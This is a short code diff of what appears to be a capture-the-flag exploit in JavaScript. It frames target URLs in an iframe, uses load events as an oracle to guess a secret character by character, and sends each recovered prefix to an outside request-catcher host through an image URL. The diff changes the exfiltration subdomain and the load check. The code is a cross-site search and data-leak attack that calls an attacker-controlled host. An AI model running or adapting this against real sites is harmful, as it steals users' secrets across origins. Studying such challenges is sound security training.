@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.contentWindow.document.readyState === 'complete' && iframe.contentWindow.document.status === 200)
+                if (iframe.contentWindow.readyState === 'complete')
                     return resolve();
                 else
                     return reject();
@@ -30,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://oewybdz.request.dreamhack.games/${secret}`;
+                    img.src = `https://awnkntd.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
